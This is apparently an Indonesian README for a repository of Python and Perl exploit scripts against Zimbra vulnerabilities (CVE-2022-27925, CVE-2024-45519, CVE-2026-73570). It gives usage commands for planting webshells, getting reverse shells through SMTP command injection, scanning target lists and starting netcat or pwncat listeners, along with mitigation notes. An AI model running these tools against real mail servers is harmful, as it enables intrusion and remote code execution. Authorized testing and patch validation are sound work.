# Zimbra CVE Research Toolkit

Kumpulan skrip Python untuk pengujian keamanan terotorisasi terhadap instalasi Zimbra Collaboration Suite yang terdampak oleh kerentanan berikut:

- **CVE-2022-27925**: path traversal yang dapat berujung pada remote code execution melalui layanan `mboximport`.
- **CVE-2024-45519**: injeksi perintah pada layanan Postjournal melalui SMTP yang dapat digunakan untuk memperoleh reverse shell.

Proyek ini ditujukan untuk kegiatan riset keamanan, validasi patch, dan penetration test dengan izin tertulis dari pemilik sistem.

## Peringatan Penggunaan

Skrip di dalam repositori ini bersifat ofensif dan dapat menulis file pada target atau menjalankan perintah melalui reverse shell. Jangan menggunakannya terhadap sistem, domain, alamat IP, atau akun yang tidak Anda miliki atau tidak secara eksplisit Anda diizinkan untuk uji.

Penulis tidak bertanggung jawab atas kerusakan, kehilangan data, gangguan layanan, atau konsekuensi hukum akibat penggunaan yang tidak sah. Lakukan pengujian pada lingkungan lab atau maintenance window, siapkan backup, dan dokumentasikan ruang lingkup pengujian terlebih dahulu.

## Struktur Proyek

```text
.
├── CVE-2022-27925/
│   └── CVE-2022-27925.py
├── CVE-2024-45519/
│   ├── CVE-2024-45519.py
│   └── requirements.txt
├── .gitignore
└── README.md
```

## Prasyarat

- Linux atau sistem operasi yang kompatibel dengan Python 3.
- Python 3.8 atau lebih baru.
- Akses jaringan ke target yang memang termasuk dalam scope pengujian.
- Untuk CVE-2024-45519, port listener reverse shell harus dapat dijangkau dari target.
- Hak akses yang cukup untuk memasang dependensi dan membuka port listener lokal.

## Instalasi

Disarankan menggunakan virtual environment agar dependensi proyek tidak mengubah instalasi Python sistem.

```bash
git clone https://github.com/gagaltotal/zimbra-cve
cd zimbra-cve

python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r CVE-2024-45519/requirements.txt
```

Skrip CVE-2022-27925 memerlukan `requests`. Jika belum tersedia di environment yang digunakan:

```bash
python -m pip install requests
```

Dependensi CVE-2024-45519 tercantum di [CVE-2024-45519/requirements.txt](CVE-2024-45519/requirements.txt): `Faker`, `pwntools`, `pwncat-vl`, dan `rich_click`.

## Penggunaan

### CVE-2022-27925

![Screen Capture](https://raw.githubusercontent.com/gagaltotal/zimbra-cve/refs/heads/main/images/Screenshot%20from%202026-08-27%2022-39-26.png)

Masuk ke direktori skrip, lalu jalankan pengujian terhadap satu URL:

```bash
cd CVE-2022-27925
python3 CVE-2022-27925.py --target https://target.example.com
```

Opsi yang tersedia:

| Opsi | Deskripsi |
| --- | --- |
| `-t`, `--target URL` | Menguji satu target URL. Jika skema tidak ditulis, skrip menggunakan `https://`. |
| `-l`, `--list FILE` | Membaca daftar target, satu URL per baris. Baris kosong dan baris yang diawali `#` diabaikan. |
| `-v`, `--verbose` | Menampilkan informasi debugging tambahan. |
| `-h`, `--help` | Menampilkan bantuan penggunaan. |

Contoh pengujian daftar target:

```bash
printf '%s\n' 'https://mail.example.com' 'https://zimbra.example.net' > targets.txt
python3 CVE-2022-27925.py --list targets.txt --verbose
```

Jika berhasil, skrip akan menguji webshell yang dibuat dan menampilkan lokasinya. Pada pengujian satu target, skrip juga menawarkan sesi interaktif melalui webshell.

### CVE-2024-45519

Skrip ini menghubungi layanan SMTP target dan menjalankan listener reverse shell lokal.

![Screen Capture](https://raw.githubusercontent.com/gagaltotal/zimbra-cve/refs/heads/main/images/Screenshot%20from%202026-08-27%2022-40-40.png)

```bash
cd CVE-2024-45519
python3 CVE-2024-45519.py target.example.com
```

Opsi yang tersedia:

| Opsi | Default | Deskripsi |
| --- | --- | --- |
| `TARGET` | wajib | Hostname atau alamat IP layanan SMTP target. |
| `-p`, `--port` | `25` | Port SMTP target. |
| `-lh`, `--lhost` | `0.0.0.0` | Alamat lokal tempat listener menerima koneksi. Gunakan alamat interface yang dapat dijangkau target bila diperlukan. |
| `-lp`, `--lport` | `4444` | Port listener reverse shell. |
| `-v`, `--verbose` | nonaktif | Mengaktifkan output debugging. |
| `--help-full` | - | Menampilkan bantuan lengkap, contoh, dan catatan. |

Contoh dengan port SMTP dan listener khusus:

```bash
python3 CVE-2024-45519.py target.example.com --port 25 --lhost 10.10.10.5 --lport 5555 --verbose
```

Pastikan port listener tidak sedang digunakan dan firewall mengizinkan koneksi masuk dari target. Sesi yang diterima dikelola oleh `pwncat`.

## Format Daftar Target

File target untuk CVE-2022-27925 menggunakan satu target per baris. Komentar dapat ditulis dengan awalan `#`.

```text
# Sistem staging yang telah disetujui
https://zimbra-staging.example.com
mail.example.net
```

File seperti `targets.txt`, hasil output, dan log lokal sebaiknya tidak di-commit ke repositori.

## Verifikasi Dasar

Validasi sintaks Python dapat dilakukan tanpa menghubungi target:

```bash
python3 -m py_compile \
	CVE-2022-27925/CVE-2022-27925.py \
	CVE-2024-45519/CVE-2024-45519.py
```

Perintah bantuan juga dapat digunakan untuk memeriksa instalasi dan opsi CLI:

```bash
python3 CVE-2022-27925/CVE-2022-27925.py --help
python3 CVE-2024-45519/CVE-2024-45519.py --help-full
```

Perintah tersebut hanya menampilkan bantuan. Jangan menjalankan skrip eksploitasi terhadap target sebelum scope dan izin pengujian dipastikan.

## Mitigasi dan Referensi

- Terapkan patch resmi Zimbra untuk CVE yang relevan.
- Batasi akses ke panel administrasi dan layanan SMTP dari jaringan yang tidak dipercaya.
- Pantau log HTTP, SMTP, dan proses pada host Zimbra untuk aktivitas tidak biasa.
- Uji ulang setelah patch diterapkan menggunakan prosedur keamanan organisasi.

## Pembaruan Folder CVE-2026-73570

Folder `CVE-2026-73570` berisi skrip Perl untuk validasi keamanan terotorisasi terhadap kerentanan injeksi perintah pada notifikasi SNMP Zimbra melalui layanan SMTP. Skrip mendukung pengujian satu target atau daftar target, koneksi SMTP dengan STARTTLS atau TLS langsung, listener reverse shell, output verbose, dan penyimpanan log sesi.

Struktur folder:

```text
CVE-2026-73570/
└── CVE-2026-73570.pl
```

Skrip memerlukan Perl beserta modul `IO::Socket::INET`, `IO::Socket::SSL`, `MIME::Base64`, `Digest::HMAC_MD5`, dan modul standar lain yang digunakan oleh skrip.

Contoh penggunaan terhadap satu target:

![Screen Capture](https://raw.githubusercontent.com/gagaltotal/zimbra-cve/refs/heads/main/images/Screenshot%20from%202026-08-28%2021-08-02.png)

```bash
cd CVE-2026-73570
perl CVE-2026-73570.pl -H mail.target.com -r 10.10.10.1 -R 4444
```

Contoh penggunaan dengan daftar target:

```bash
perl CVE-2026-73570.pl -f targets.txt -r 10.10.10.1 -R 4444
```

Daftar target mendukung hostname atau alamat IP dengan port opsional, satu target per baris. Port default adalah `587`; gunakan `-p` untuk menggantinya. Listener penerima harus dijalankan pada mesin penguji, misalnya:

```bash
nc -lvnp 4444
```

Gunakan opsi `-S` untuk TLS langsung, `-v` untuk detail komunikasi SMTP, `-L FILE` untuk menyimpan log, dan `-h` untuk melihat seluruh opsi. Terapkan patch resmi Zimbra sebelum melakukan validasi dan pastikan setiap target serta alamat listener berada dalam scope pengujian.

## Lisensi

Repositori ini belum menyertakan berkas lisensi. Penggunaan dan redistribusi kode mengikuti ketentuan dari pemilik repositori serta hukum yang berlaku.

## Referensi resmi:

- [NVD: CVE-2022-27925](https://nvd.nist.gov/vuln/detail/CVE-2022-27925)
- [NVD: CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)
- [Zimbra Security Center](https://www.zimbra.com/security/)
- [CVE-2026-73570](https://github.com/gabrielunknown/cve-2026-73570)